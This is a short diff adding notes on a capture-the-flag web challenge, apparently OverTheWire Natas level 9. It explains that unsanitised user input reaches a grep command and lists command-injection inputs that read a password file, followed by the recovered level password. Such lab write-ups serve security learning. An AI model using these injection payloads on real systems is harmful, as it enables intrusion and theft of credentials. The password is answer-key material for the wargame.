@@ -1,0 +1,7 @@
+We can see there is a source code that runs a grep over a file called dictionary.txt, we can see $key is the value that it will be search, but also it comes from the user, so we can do whatever we want with that parameter, so let's inject some commands there
+
+first input -> ; && ls -a # 
+
+; cat /etc/natas_webpass/natas10 #
+
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
